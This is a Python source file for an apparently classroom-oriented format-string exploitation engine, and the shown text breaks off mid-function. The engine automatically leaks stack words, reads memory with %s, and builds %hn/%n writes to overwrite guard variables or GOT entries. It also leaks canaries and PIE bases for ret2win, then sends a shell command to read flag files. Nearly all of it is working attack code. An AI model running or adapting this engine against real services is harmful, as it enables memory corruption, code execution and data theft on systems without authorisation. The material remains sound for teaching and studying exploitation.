#!/usr/bin/env python3
"""Authorised coursework; localhost/classroom use; dummy flags.

One format-string engine for every shape Lab 10 teaches, 32- AND 64-bit, with nothing
typed by hand. Written because the older tools only handled "32-bit, and the service
prints the target address for you":

  what the challenge looks like                         goal      lab section
  ----------------------------------------------------  --------  -----------------------
  flag bytes sit on the stack                           stack     Attack 1 (%x)
  a POINTER to the flag sits on the stack               strings   Attack 1 (%x-%s)
  flag/secret is a global, nothing points at it         globals   Attack 1 + address
  `if (target == 0x..)` / `if (target)` on a global     guard     Writing with %n
  win() exists, GOT writable                            got       GOT overwrite
  printf(name) first, overflow second (canary / PIE)    leakbof   fmt leak + Lab 10 BOF
  printf(name) first, then "guess my number/password"   echo      Attack 1, answered back
  printf(input) in a loop, no win(), nothing leaked     gotsys    GOT -> system (last exercise)

  python3 fmtpwn.py HOST PORT --binary ./chall              # try everything, cheapest first
  python3 fmtpwn.py HOST PORT                               # no binary: stack + strings
  python3 fmtpwn.py HOST PORT --goal dump                   # just show me the stack words
  python3 fmtpwn.py HOST PORT --goal read  --addr 0x804c060 # print the string at an address
  python3 fmtpwn.py HOST PORT --goal write --addr 0x804c034 --value 0x64
  python3 fmtpwn.py HOST PORT --binary ./chall --pre 2      # bug is behind menu option 2

How the write works (and why it differs from the lab's layout): the lab puts the target
address at the FRONT of the string. That cannot work on 64-bit - every address there
contains NUL bytes, and printf stops parsing at the first NUL - and it cannot write a
value smaller than the bytes already printed. So the addresses go at the END, after the
format, and the argument index is computed to point at them. Same %hn idea, any value,
either word size.
"""
import argparse, os, re, socket, struct, subprocess, sys, time, types

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from flags import decode_and_find, find_flag, STRONG_PATTERNS          # noqa: E402

try:
    import auto_pwn as GATES                          # answer_gate / pass_gates
except Exception:                                     # noqa: BLE001
    GATES = None

M1, M2 = b"QZ<", b">ZQ"                               # markers around what printf produced
DEFAULT_CMD = "cat flag.txt flag flag* flags/* /home/*/flag* 2>/dev/null"


def log(msg):
    print(msg, flush=True)


# --------------------------------------------------------------------------- I/O
class Target:
    """One format-string shot per connection: banner, optional --pre lines, payload,
    optional follow-up lines (many programs read again before they check anything)."""

    def __init__(self, host, port, pre=(), timeout=4.0, idle=0.35, verbose=False):
        self.host, self.port, self.pre = host, port, list(pre)
        self.timeout, self.idle, self.verbose = timeout, idle, verbose
        self.conns = 0
        self.closed = False
        self.gated = False
        self.rtt = 0.0            # measured delay of this link (handshake / first banner byte)
        self.tail = None          # last bytes of the prompt, learned on the first connect
        self.last_banner = b""

    def _recv(self, s, idle=None, max_wait=3.0, until=None, done=None):
        """Read until the line goes quiet. `until` (bytes) or `done` (a test on what has
        arrived) ends the wait early - without them every read costs a full idle timeout,
        and a 40-connection scan spends most of its budget waiting for nothing."""
        out, t0 = b"", time.time()
        # Two different waits. BETWEEN chunks of a reply, a short idle is right. For the
        # FIRST byte it is not: that wait includes a full round trip, and 0.35 s is less
        # than one round trip to a cloud host with a little jitter. The engine then read
        # nothing, concluded "this input is not a format string", and quit - sometimes,
        # which is worse than always. The first-byte wait is scaled to the measured link.
        gap = max(idle or self.idle, self.rtt * 0.5 + 0.1)
        s.settimeout(max(gap, 3 * self.rtt + 0.3))
        max_wait = max(max_wait, 6 * self.rtt + 1.0)
        while time.time() - t0 < max_wait:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            except OSError:
                self.closed = True
                break
            if not d:
                self.closed = True
                break
            out += d
            s.settimeout(gap)
            if until and until in out:
                s.settimeout(0.05)            # the closing marker IS the end; drain briefly
            elif done and done(out):
                # A flag has appeared, but a shell that ran `cat flag* flags/*` may still
                # be sending more of them. Over a slow link they arrive in later packets,
                # and cutting off here hid them from the "more flag-shaped strings" list.
                s.settimeout(max(0.05, gap))
        return out

    def open(self):
        self.conns += 1
        self.closed = False
        t0 = time.time()
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        first_conn = self.conns <= 1 and not self.rtt
        if first_conn:
            # Nothing is known about the link yet: wait generously for the first banner,
            # and time it. Later connections use what was measured.
            self.rtt = max(time.time() - t0, 0.001)
            s.settimeout(2.5)
            try:
                peek = s.recv(1, socket.MSG_PEEK)
            except (socket.timeout, OSError):
                peek = b""
            if peek:
                self.rtt = max(self.rtt, time.time() - t0)
        # The prompt ends the same way on every connection (even when a greeting above it
        # is random), so after the first one we stop as soon as that ending arrives.
        banner = self._recv(s, until=self.tail)
        # A live gate ("what is 37 + 58 ?", "echo this token") stands in front of the bug
        # and changes every connection: answer it here, so every goal works behind it.
        gated = False
        if GATES is not None and GATES.answer_gate(banner) is not None:
            ns = types.SimpleNamespace(timeout=self.timeout, idle=self.idle, gate_delay=0.25)
            banner, _fast = GATES.pass_gates(s, ns, banner)
            gated = self.gated = True
        if not getattr(self, "_learned", False):
            self._learned = True
            import flags as _fl
            new = _fl.learn_ignore(banner)
            if new:
                log(f"[*] the service prints flag-shaped text before any input - not a flag, "
                    f"ignored: {', '.join(new[:4])}")
        if self.tail is None and len(banner.strip()) >= 3 and not self.pre and not gated:
            self.tail = banner.rstrip(b" ")[-6:] or None
        for line in self.pre:
            s.sendall(line.encode("latin-1", "replace") + b"\n")
            banner += self._recv(s)
        return s, banner

    def shot(self, payload, post=("",), until=None, max_wait=3.0, done=None):
        """Send one payload; return everything the service said AFTER it."""
        try:
            s, banner = self.open()
        except OSError as exc:
            if self.verbose:
                log(f"    [conn] {exc}")
            return b""
        out = b""
        try:
            s.sendall(payload + b"\n")
            out += self._recv(s, until=until, max_wait=max_wait, done=done)
            for line in post or ():
                if self.closed or (done and done(out)):
                    break
                try:
                    s.sendall(line.encode("latin-1", "replace") + b"\n")
                except OSError:
                    break
                out += self._recv(s, max_wait=max_wait, done=done)
        except OSError:
            pass
        finally:
            s.close()
        if self.verbose:
            log(f"    [>] {payload[:90]!r}{'...' if len(payload) > 90 else ''}")
            log(f"    [<] {out[:200]!r}{'...' if len(out) > 200 else ''}")
        self.last_banner = banner
        return out


def between(out):
    """What printf produced for the part of the payload between the markers."""
    a = out.find(M1)
    if a < 0:
        return None
    b = out.find(M2, a + len(M1))
    return out[a + len(M1):b] if b >= 0 else None


# ---------------------------------------------------------------------- flag check
def flag_in(out, payload=b"", regex=None):
    """A flag in the reply that is not just our own payload echoed back."""
    text = out.decode("latin-1", "replace")
    f, _how = decode_and_find(text, regex, strong_only=True)
    if not f:
        return None
    if payload and f.encode("latin-1", "replace") in payload:
        return None
    return f


# -------------------------------------------------------------------- measurements
def measure_maxlen(t):
    """How many bytes of ONE input line reach printf? fgets(buf, 64) keeps 63; a format
    that does not fit is silently cut and the write never happens. Measured, not assumed."""
    probe = M1 + b"X" * 380
    out = t.shot(probe, post=())
    a = out.find(M1)
    if a < 0:
        return None
    n = len(M1)
    body = out[a + n:]
    run = len(body) - len(body.lstrip(b"X"))
    return min(n + run, 380 + n)


WORKERS = 8          # concurrent connections for independent probes (see pmap)


def pmap(fn, items, workers=None):
    """fn(item) for every item, several at a time, yielding (item, result) as each ends.

    On loopback a connection costs 80 ms and nobody notices forty of them. Over a real
    link (the practice host was ~230 ms away) each one is three round trips, about a
    second, and forty of them is the whole time budget: lab Attack 1 solved in 3 s on
    localhost and timed out through a 150 ms proxy. The probes are independent - one
    connection each, no shared state - so they do not have to queue."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    items = list(items)
    if not items:
        return
    with ThreadPoolExecutor(max_workers=max(1, min(workers or WORKERS, len(items)))) as ex:
        futs = {ex.submit(fn, it): it for it in items}
        for fut in as_completed(futs):
            try:
                yield futs[fut], fut.result()
            except Exception:                       # noqa: BLE001 - one bad connection is not fatal
                yield futs[fut], None


def _parse_words(slots, body, vals):
    for k, tok in zip(slots, body.split(b"|")):
        tok = tok.strip()
        if tok.startswith(b"0x"):
            try:
                vals[k] = int(tok, 16)
            except ValueError:
                pass
        elif tok == b"(nil)":
            vals[k] = 0


def dump(t, lo, hi, maxlen, bits_hint=None):
    """Stack words lo..hi-1 as printf sees them: {slot: int}. Several per connection, and
    the connections side by side. A chunk that comes back unreadable is retried one slot
    at a time (a tiny buffer, or one slot whose output breaks the markers)."""
    vals = {}
    per = max(1, (maxlen - len(M1) - len(M2)) // 8)      # "%NN$p|" is at most 7 bytes
    chunks = []
    i = lo
    while i < hi:
        slots = list(range(i, min(i + per, hi)))
        while len(slots) > 1 and len(M1 + b"|".join(b"%%%d$p" % k for k in slots) + M2) > maxlen:
            slots.pop()
        chunks.append(slots)
        i = slots[-1] + 1

    def one(slots):
        payload = M1 + b"|".join(b"%%%d$p" % k for k in slots) + M2
        return between(t.shot(payload, post=(), until=M2))

    retry = []
    for slots, body in pmap(one, chunks):
        if body is None:
            retry += [[k] for k in slots] if len(slots) > 1 else []
        else:
            _parse_words(slots, body, vals)
    for slots, body in pmap(one, retry):
        if body is not None:
            _parse_words(slots, body, vals)
    return vals


def find_slot(t, bits, maxlen, limit=80, deadline=None):
    """Which printf argument is the start of OUR buffer, and how many filler bytes align
    it to a word boundary. Returns (slot, pad, bits)."""
    words = [bits] if bits else [64, 32]
    per = max(1, (maxlen - 16 - len(M1) - len(M2)) // 8)
    for pad in range(0, 8):
        if bits == 32 and pad >= 4:
            break
        i = 1
        while i <= limit:
            if deadline and time.time() > deadline:
                return None, 0, bits
            slots = list(range(i, min(i + per, limit + 1)))
            payload = b"P" * pad + b"AAAABBBB" + M1 + b"|".join(b"%%%d$p" % k for k in slots) + M2
            body = between(t.shot(payload, post=(), until=M2))
            if body is None:
                if per > 1:
                    per = max(1, per // 2)
                    continue
                i += 1
                continue
            toks = [x.strip().lower() for x in body.split(b"|")]
            for j, tok in enumerate(toks):
                if tok == b"0x4242424241414141" and 64 in words:
                    return slots[j], pad, 64
                if tok == b"0x41414141" and 32 in words:
                    nxt = toks[j + 1] if j + 1 < len(toks) else None
                    if nxt in (b"0x42424242", None):
                        return slots[j], pad, 32
            i = slots[-1] + 1
    return None, 0, bits


# ----------------------------------------------------------------------- payloads
class Ctx:
    def __init__(self, t, bits, slot, pad, maxlen, bad=b"\n"):
        self.t, self.bits, self.slot, self.pad, self.maxlen, self.bad = t, bits, slot, pad, maxlen, bad
        self.word = bits // 8
        self.counts = [0]        # characters the SAME printf prints before our input

    def pack(self, v):
        return struct.pack("<Q" if self.bits == 64 else "<I", v & ((1 << self.bits) - 1))

    def _layout(self, make_fmt, addrs):
        """[pad][format, padded to a word multiple][addr][addr]...  make_fmt(first_index)
        returns the format text given the argument index of the first address."""
        w = self.word
        for fmtlen in range(w, 4096, w):
            first = self.slot + (self.pad + fmtlen) // w if (self.pad + fmtlen) % w == 0 else None
            if first is None:
                continue
            fmt = make_fmt(first)
            if len(fmt) <= fmtlen:
                tail = b"".join(self.pack(a) for a in addrs)
                return b"P" * self.pad + fmt.ljust(fmtlen, b"|") + tail
        return None

    def check(self, payload, what):
        """Refuse loudly rather than send something the input function will cut."""
        if payload is None:
            log(f"[!] {what}: could not lay the payload out")
            return False
        if self.maxlen and len(payload) > self.maxlen:
            log(f"[!] {what}: payload is {len(payload)} bytes but only {self.maxlen} reach printf")
            return False
        # A NUL is fine at the tail (printf has stopped parsing by then); a newline is not,
        # because the read itself stops there.
        hit = [b for b in self.bad if b and bytes([b]) in payload]
        if hit:
            log(f"[!] {what}: payload contains {', '.join(hex(b) for b in hit)}, which the "
                f"input function stops on")
            return False
        return True

    def read_payload(self, addr):
        return self._layout(lambda k: M1 + b"%%%d$s" % k + M2, [addr])

    def write_payload(self, writes, base=0):
        """writes: [(addr, value, nbytes)] with nbytes 1 (%hhn), 2 (%hn) or 4 (%n).
        Counts are cumulative, so the writes are sorted by value and each pad is only the
        difference from the one before."""
        spec = {1: b"hhn", 2: b"hn", 4: b"n"}
        mod = {1: 0x100, 2: 0x10000, 4: 0x100000000}
        # Sorted by distance from the count we START at, not by raw value: a value smaller
        # than what is already printed (0x0000 after 3 alignment bytes or a "You said: "
        # prefix) can only be reached by wrapping, and written first that wrap costs 64 KB
        # before the other pieces add theirs. Last, it is one short hop.
        start = self.pad + base
        ws = sorted(writes, key=lambda x: (x[1] - start) % mod[x[2]])

        def make(first):
            s, count = b"", self.pad + base
            for j, (_a, v, n) in enumerate(ws):
                padn = (v - count) % mod[n]
                if padn:
                    s += b"%%%dc" % padn
                    count += padn
                s += b"%%%d$" % (first + j) + spec[n]
            return s
        return self._layout(make, [a for a, _v, _n in ws])

    def split(self, addr, value, size=4, chunk=2):
        """One value -> %hn pieces (the lab's 'two bytes at a time'), choosing piece
        boundaries so that NO piece's address contains a byte the input function stops on.

        GOT slots are 4 apart, so `slot + 2` regularly ends in 0x0a (0x804c008 + 2): the
        newline cuts the payload and the write silently never happens. Shifting that piece
        one byte down (it then overlaps the previous one, with the same true bytes) and
        finishing with a one-byte %hhn avoids the address altogether."""
        clean = lambda a: not any(bytes([x]) in self.pack(a).rstrip(b"\x00") for x in self.bad if x)
        byte = lambda i: (value >> (8 * i)) & 0xFF
        pieces, i = [], 0
        while i < size:
            if clean(addr + i):
                if i + 1 < size:
                    pieces.append((addr + i, byte(i) | byte(i + 1) << 8, 2))
                    i += 2
                else:
                    pieces.append((addr + i, byte(i), 1))
                    i += 1
            elif i >= 1 and clean(addr + i - 1):
                pieces.append((addr + i - 1, byte(i - 1) | byte(i) << 8, 2))
                i += 1
            else:
                return [(addr + j, (value >> (8 * j)) & 0xFFFF, 2) for j in range(0, size, 2)]
        return pieces


# ------------------------------------------------------------------- static facts
def load_elf(path):
    if not path:
        return None, {}
    try:
        from elftool import ELF
        e = ELF(path)
        return e, e.report()
    except Exception as exc:                       # noqa: BLE001
        log(f"[!] could not parse {path}: {exc}")
        return None, {}


def disasm(path):
    try:
        return subprocess.run(["objdump", "-d", "-M", "intel", "--no-show-raw-insn", path],
                              capture_output=True, text=True, timeout=20).stdout
    except (OSError, subprocess.SubprocessError):
        return ""


def functions_text(txt):
    """{name: [lines]} from objdump output."""
    out, cur = {}, None
    for line in txt.splitlines():
        m = re.match(r"^[0-9a-f]+ <([^>]+)>:", line)
        if m:
            cur = m.group(1)
            out[cur] = []
        elif cur and line.strip():
            out[cur].append(line)
    return out


CRT_FUNCS = ("deregister_tm_clones", "register_tm_clones", "frame_dummy", "vuln_gets")


def _imm(tok):
    try:
        return int(tok, 16) if tok.lower().startswith("0x") else int(tok)
    except ValueError:
        return None


def guard_values(txt, addr, got_base=None):
    """Values a global at `addr` is compared against: follow each instruction that touches
    the address to the cmp/test just after it. `cmp x, 0x64` -> 0x64; a test against zero
    -> 1 then 0 (the guard only has to become true, or become false).

    32-bit code is position-independent by default even in a non-PIE link, so it never
    names the address: it says `[ebx+0x34]` with ebx = the GOT. Both spellings are
    matched, otherwise the guard value is invisible on exactly the builds the labs use."""
    lines = txt.splitlines()
    alts = [r"\b(?:0x)?%x\b" % addr]
    if got_base is not None:
        d = addr - got_base
        alts.append(r"\[e[a-ds][xi][+-]0x%x\]" % abs(d) if d else r"\[e[a-ds][xi]\]")
    pat = re.compile("|".join(alts))
    vals = []
    for i, line in enumerate(lines):
        if not pat.search(line.split("\t", 1)[-1]):
            continue
        for j in range(i, min(i + 4, len(lines))):
            m = re.search(r"\bcmp\s+[^,]+,\s*(0x[0-9a-fA-F]+|\d+)\s*(?:#.*)?$", lines[j])
            if m:
                v = _imm(m.group(1))
                for x in ([v] if v else [1, 0]):
                    if x is not None and x not in vals:
                        vals.append(x)
                break
            if re.search(r"\btest\s+(\w+),\s*\1\b", lines[j]):
                for x in (1, 0):
                    if x not in vals:
                        vals.append(x)
                break
    return vals


def all_cmp_imms(txt, limit=6, image=()):
    """Every cmp constant in the program's OWN functions - the fallback when the guard's
    cmp could not be tied to the global. Addresses inside the image and all-ones masks
    are compiler plumbing (crt stubs compare pointers), not guards."""
    out = []
    for name, lines in functions_text(txt).items():
        if name.startswith("_") or name in CRT_FUNCS or "@plt" in name:
            continue
        for ln in lines:
            m = re.search(r"\bcmp\s+[^,\n]+,\s*(0x[0-9a-fA-F]+|\d+)\s*$", ln)
            v = _imm(m.group(1)) if m else None
            if not v or v in out or v >= 0xFFFFFFFF:
                continue
            if any(lo <= v < hi for lo, hi in image):
                continue
            out.append(v)
    return out[:limit]


def plt_calls(lines):
    return [m.group(1) for ln in lines
            for m in [re.search(r"call\s+[0-9a-f]+ <([A-Za-z_][\w]*)@plt>", ln)] if m]


def local_calls(lines):
    return [m.group(1) for ln in lines
            for m in [re.search(r"call\s+[0-9a-f]+ <([A-Za-z_][\w.]*)>", ln)] if m]


def got_order(ftxt, got, wins):
    """GOT entries to try, best first: the functions the program calls AFTER a printf (one
    of those is the next call once our write has landed), then the rest. Entries win()
    itself depends on go last - redirecting fopen to win() breaks win()."""
    after = []
    for name, lines in ftxt.items():
        if name in wins:
            continue
        calls = plt_calls(lines)
        seen_printf = False
        for c in calls:
            if seen_printf and c not in after:
                after.append(c)
            if c in ("printf", "__printf_chk"):
                seen_printf = True
    needs = set()
    for w in wins:
        todo, done = [w], set()
        while todo:
            f = todo.pop()
            if f in done or f not in ftxt:
                continue
            done.add(f)
            needs.update(plt_calls(ftxt[f]))
            todo += local_calls(ftxt[f])
    needs.discard("exit")
    needs.discard("_exit")
    first = [f for f in after if f in got and f not in needs]
    rest = [f for f in got if f not in first and f not in needs and not f.startswith("_")]
    last = [f for f in got if f in needs]
    return first + rest + last


def return_sites(txt):
    """Addresses a `call` returns to, plus function starts: the values a leaked code
    pointer can be, used to recover a PIE base from its (ASLR-proof) low 12 bits."""
    sites, lines = [], txt.splitlines()
    for i, line in enumerate(lines):
        if re.search(r"\bcall\b", line):
            for j in range(i + 1, min(i + 3, len(lines))):
                m = re.match(r"^\s*([0-9a-f]+):", lines[j])
                if m:
                    sites.append(int(m.group(1), 16))
                    break
    for m in re.finditer(r"^([0-9a-f]+) <[^>]+>:", txt, re.M):
        sites.append(int(m.group(1), 16))
    return sorted(set(sites))


# ---------------------------------------------------------------------------- goals
def solved(flag, how, reply=b""):
    # A shell that ran `cat flag* flags/*` may have printed several; the first is not
    # necessarily this challenge's, so none is silently dropped - and the HEADLINE says
    # so, because that is the line people copy from.
    others = []
    for m in re.finditer(STRONG_PATTERNS[1], reply.decode("latin-1", "replace")):
        if m.group(0) != flag and m.group(0) not in others:
            others.append(m.group(0))
    if others:
        log(f"[+] FLAG ({how}) - ONE OF {len(others) + 1} in this reply, NOT necessarily this "
            f"challenge's; the full list follows: {flag}")
    else:
        log(f"[+] FLAG ({how}): {flag}")
    if others:
        log(f"[+] {len(others)} more flag-shaped string(s) in the same reply - check which "
            f"one belongs to THIS challenge:")
        for o in others[:200]:
            log(f"[+]   {o}")
    return True


def goal_stack(cx, args, st):
    """Flag bytes lying on the stack: dump words, decode little-endian, look."""
    vals = st.setdefault("dump", dump(cx.t, 1, args.slots + 1, cx.maxlen))
    if not vals:
        log("[-] stack: nothing came back")
        return False
    width = cx.bits // 4
    words = [vals.get(k, 0) for k in range(1, max(vals) + 1)]
    blob = b"".join(struct.pack("<Q" if cx.bits == 64 else "<I", w & ((1 << cx.bits) - 1)) for w in words)
    f = find_flag(blob, args.flag_regex, strong_only=True)
    if f:
        return solved(f, f"stack words 1..{max(vals)} decoded little-endian")
    # A 32-bit value printed by a 64-bit %p (or the reverse) decodes at the other width.
    blob2 = b"".join(struct.pack("<I", w & 0xFFFFFFFF) for w in words)
    f = find_flag(blob2, args.flag_regex, strong_only=True)
    if f:
        return solved(f, "stack words decoded as 32-bit little-endian")
    log(f"[-] stack: {len(vals)} words read, no flag among them ({width} hex digits per word)")
    return False


def pointerish(v, bits):
    if v < 0x10000:
        return False
    if bits == 64:
        return v < 0x800000000000
    return True


def goal_strings(cx, args, st):
    """A pointer to the flag on the stack (lab Attack 1, `%x-%s`). %s on a non-pointer
    crashes, so each try is its own connection - but only slots that HOLD a pointer are
    worth a connection, which is what keeps this inside a time budget."""
    vals = st.setdefault("dump", dump(cx.t, 1, args.slots + 1, cx.maxlen))
    slots = [k for k in sorted(vals) if pointerish(vals[k], cx.bits)]
    if not vals:
        slots = list(range(1, args.slots + 1))
    log(f"[*] strings: {len(slots)} of {len(vals)} stack slots hold a pointer; trying %N$s on each")
    seen = []

    def one(k):
        if time.time() > st["deadline"]:
            return None
        return cx.t.shot(M1 + b"%%%d$s" % k + M2, post=(), until=M2)

    hit = None
    for k, out in pmap(one, slots):
        if out is None:
            continue
        payload = M1 + b"%%%d$s" % k + M2
        f = flag_in(out, payload, args.flag_regex)
        if f and (hit is None or k < hit[0]):
            hit = (k, f)                       # keep draining: the pool is already running
        body = between(out)
        if body and len(body) >= 4 and body.isascii() and args.verbose:
            seen.append((k, body[:60]))
    if hit:
        return solved(hit[1], f"%{hit[0]}$s - a pointer on the stack")
    if time.time() > st["deadline"]:
        log("[!] strings: out of time")
    for k, body in sorted(seen)[:12]:
        log(f"    %{k}$s -> {body!r}")
    log("[-] strings: no slot pointed at a flag")
    return False


def read_at(cx, addr, what=""):
    """(reply, payload) for a %s read of the string at addr. If the address itself holds a
    byte the input function stops on, read from addr+1: same string, one byte shorter."""
    for a in (addr, addr + 1):
        if any(bytes([b]) in cx.pack(a).rstrip(b"\x00") for b in cx.bad if b):
            continue
        payload = cx.read_payload(a)
        if not cx.check(payload, f"read {hex(a)}"):
            return None, payload
        return cx.t.shot(payload, post=(), until=M2), payload
    log(f"[!] read {hex(addr)}{what}: the address itself contains a byte the input stops on")
    return None, b""


def goal_globals(cx, args, st, elf, rep):
    """The flag is a global and nothing on the stack points at it: put its address in the
    payload and read it with %s. Addresses come from the symbol table."""
    if not elf:
        log("[-] globals: needs --binary for addresses")
        return False
    if rep.get("pie"):
        log("[-] globals: PIE binary - addresses move every run; needs a leak + a second printf")
        return False
    cands = []
    secs = {s["name"]: s for s in elf.sections}
    def in_sec(a, names):
        return any(n in secs and secs[n]["addr"] <= a < secs[n]["addr"] + secs[n]["size"] for n in names)
    for name, addr in elf.symbols.items():
        if name in elf.functions or name.startswith("_") or "@" in name or "." in name:
            continue
        if name in ("completed", "data_start", "stdin", "stdout", "stderr"):
            continue
        if in_sec(addr, (".data", ".bss", ".rodata")):
            hot = bool(re.search(r"flag|secret|pass|key|token|hidden", name, re.I))
            cands.append((0 if hot else 1, addr, name))
    # Literals that look like a placeholder for the real thing: the remote copy holds the
    # real flag at the same address.
    ro = secs.get(".rodata")
    if ro:
        data = elf.data[ro["offset"]:ro["offset"] + ro["size"]]
        for m in re.finditer(rb"[\x20-\x7e]{4,}", data):
            s = m.group(0)
            if re.search(rb"\{.*\}|flag|secret|redacted|placeholder|dummy|fake", s, re.I) \
                    and b"%" not in s and b"/" not in s:
                cands.append((1, ro["addr"] + m.start(), "rodata:" + s[:24].decode("latin-1")))
    if not [c for c in cands if not c[2].startswith("rodata:")] and ".bss" in secs:
        b = secs[".bss"]                      # stripped: walk .bss instead
        for a in range(b["addr"] + (-b["addr"] % 32), b["addr"] + min(b["size"], 512), 32):
            cands.append((2, a, f"bss+{a - b['addr']:#x}"))
    cands.sort()
    if not cands:
        log("[-] globals: no candidate global to read")
        return False
    log(f"[*] globals: reading {len(cands[:16])} address(es): "
        + ", ".join(f"{n}@{a:#x}" for _p, a, n in cands[:6]) + (" ..." if len(cands) > 6 else ""))
    for _p, addr, name in cands[:16]:
        if time.time() > st["deadline"]:
            break
        out, payload = read_at(cx, addr, f" ({name})")
        if out is None:
            continue
        f = flag_in(out, payload, args.flag_regex)
        if f:
            return solved(f, f"%s read of {name} at {hex(addr)}")
        body = between(out)
        if body:
            log(f"    {name}@{addr:#x} -> {body[:70]!r}")
    log("[-] globals: none of them held a flag")
    return False


def fire_write(cx, args, writes, what):
    """Send one write. Returns None if it cannot be sent, else (flag or None, reply).

    %n counts every character the call has printed, including text the PROGRAM put in
    front of our input (`snprintf(out, "Hello, %s", name); printf(out)`). Whether a
    prefix on the line belongs to the same printf cannot be seen from outside, so when
    there is one, both counts are tried - one connection each."""
    res = None
    for base in cx.counts:
        payload = cx.write_payload(writes, base)
        if not cx.check(payload, what):
            return res
        printed = sum(v % 0x10000 for _a, v, n in writes if n == 2)
        done = lambda o, p=payload: bool(flag_in(o, p, args.flag_regex))
        out = cx.t.shot(payload, post=["", args.cmd, "exit"], done=done,
                        max_wait=4.0 if printed < 200000 else 8.0)
        res = (flag_in(out, payload, args.flag_regex), out)
        if res[0]:
            return res
    return res


def goal_guard(cx, args, st, elf, rep, txt):
    """`if (target == 0x64)` / `if (authorised)` on a global: write the value the binary
    compares against. Address from the symbol table, value from the cmp next to it."""
    if not elf:
        log("[-] guard: needs --binary (use --goal write --addr A --value V by hand)")
        return False
    if rep.get("pie"):
        log("[-] guard: PIE binary - a fixed address is not available")
        return False
    syms = rep.get("data_symbols") or {}
    if not syms:
        log("[-] guard: no named writable global in the binary")
        return False
    image = [(s["addr"], s["addr"] + max(s.get("size") or 0, 1)) for s in elf.sections if s.get("addr")]
    generic = all_cmp_imms(txt, image=image)
    gotplt = next((s["addr"] for s in elf.sections if s["name"] == ".got.plt"), None)
    tried = 0
    for name, addr in list(syms.items())[:4]:
        vals = guard_values(txt, addr, gotplt if cx.bits == 32 else None)
        src = "the cmp beside it" if vals else "every cmp constant in the binary"
        for v in generic + [1, 0]:
            if v not in vals:
                vals.append(v)
        log(f"[*] guard: {name}@{addr:#x} <- candidates {[hex(v) for v in vals[:8]]} (from {src})")
        for v in vals[:8]:
            if time.time() > st["deadline"]:
                log("[!] guard: out of time")
                return False
            # A value under 0x10000 leaves the high half alone unless it must be cleared.
            writes = cx.split(addr, v, 4, 2)
            r = fire_write(cx, args, writes, f"write {hex(v)} to {name}")
            tried += 1
            if r and r[0]:
                return solved(r[0], f"%hn write of {hex(v)} to {name} at {hex(addr)}")
            if r is None and v < 0x10000:
                # Short buffer: one %hn (or a bare %n) instead of two.
                r = fire_write(cx, args, [(addr, v, 2)], f"short write {hex(v)} to {name}")
                if r and r[0]:
                    return solved(r[0], f"single %hn write of {hex(v)} to {name}")
            if args.verbose and r:
                log(f"    {hex(v)} -> {r[1][-120:]!r}")
    # The required value may exist only on the wire ("Set target to 48213 to pass"): then
    # it is read from the banner of the SAME connection the write goes down.
    if GATES is not None:
        for name, addr in list(syms.items())[:3]:
            for k in range(4):
                if time.time() > st["deadline"]:
                    return False
                try:
                    s, banner = cx.t.open()
                except OSError:
                    continue
                out, v = b"", None
                try:
                    nums = GATES.banner_numbers(banner, args.binary)
                    if k >= len(nums):
                        break
                    v = nums[k]
                    payload = cx.write_payload(cx.split(addr, v, 4, 2), cx.counts[0])
                    if not cx.check(payload, f"write banner value {hex(v)} to {name}"):
                        continue
                    s.sendall(payload + b"\n")
                    out = cx.t._recv(s, max_wait=6.0)
                    if not cx.t.closed and not flag_in(out, payload, args.flag_regex):
                        s.sendall(b"\n" + args.cmd.encode() + b"\n")
                        out += cx.t._recv(s)
                except OSError:
                    pass
                finally:
                    s.close()
                tried += 1
                f = flag_in(out, b"", args.flag_regex)
                if f:
                    return solved(f, f"%hn write of {v} ({hex(v)}, announced in the banner of this "
                                     f"connection) to {name} at {hex(addr)}", out)
    log(f"[-] guard: {tried} write(s) sent, none produced a flag")
    return False


def goal_got(cx, args, st, elf, rep, txt):
    """win() exists and the GOT is writable: point the next library call at win()."""
    if not elf:
        log("[-] got: needs --binary")
        return False
    wins = rep.get("win_symbols") or {}
    got = rep.get("got") or {}
    if not wins or not got:
        log("[-] got: no win-like symbol or no GOT entries")
        return False
    if rep.get("relro") == "full":
        log("[-] got: FULL RELRO - the GOT is read-only (a .data function pointer is the way)")
        return False
    if rep.get("pie"):
        log("[-] got: PIE binary - needs the base first")
        return False
    order = got_order(functions_text(txt), got, set(wins))
    log(f"[*] got: redirect one of {order[:6]} to {list(wins)} (functions called after printf first)")
    for wname, waddr in wins.items():
        for fn in order:
            if time.time() > st["deadline"]:
                log("[!] got: out of time")
                return False
            slot = got[fn]
            size = 4 if cx.bits == 32 else 6          # 64-bit: clear bytes 4-5 of a libc pointer
            r = fire_write(cx, args, cx.split(slot, waddr, size, 2), f"{fn}@GOT -> {wname}")
            if r and r[0]:
                return solved(r[0], f"{fn}@GOT ({hex(slot)}) overwritten with {wname} ({hex(waddr)})", r[1])
    log("[-] got: no overwrite produced a flag")
    return False


def goal_leakbof(cx, args, st, elf, rep, txt):
    """printf(input) FIRST, an overflow SECOND, in the same connection: the format string
    leaks whatever the overflow is missing (the canary, the PIE base), then ret2win."""
    if not elf:
        log("[-] leakbof: needs --binary")
        return False
    wins = rep.get("win_symbols") or {}
    if not wins:
        log("[-] leakbof: no win-like symbol to return to")
        return False
    offsets = list(rep.get("ret_offset_candidates") or [])
    if not offsets:
        log("[-] leakbof: no overflow offset candidates in the binary")
        return False
    import auto_pwn as ap
    bits, w = cx.bits, cx.word
    need_canary, need_pie = bool(rep.get("canary")), bool(rep.get("pie"))
    d1 = st.setdefault("dump", dump(cx.t, 1, args.slots + 1, cx.maxlen))
    d2 = dump(cx.t, 1, args.slots + 1, cx.maxlen)

    canaries = []
    if need_canary:
        for k in sorted(d1):
            a, b = d1[k], d2.get(k)
            if b is None or a == b or a & 0xFF or b & 0xFF or not a:
                continue
            if bits == 64:
                score = 0 if (a >> 48) else 2
            else:
                score = 2 if (a >> 24) in (0xF7, 0xFF, 0x56, 0x57, 0x08) else 0
            canaries.append((score, k))
        canaries = [k for _s, k in sorted(canaries)]
        if not canaries:
            log("[-] leakbof: binary has a canary but no stack slot looks like one "
                "(low byte 00, different every run)")
            return False
        log(f"[*] leakbof: canary candidates at slots {canaries[:4]} (low byte 00, changes every run)")

    pies = []
    if need_pie:
        sites = return_sites(txt)
        by_low = {}
        for s in sites:
            by_low.setdefault(s & 0xFFF, []).append(s)
        votes = {}
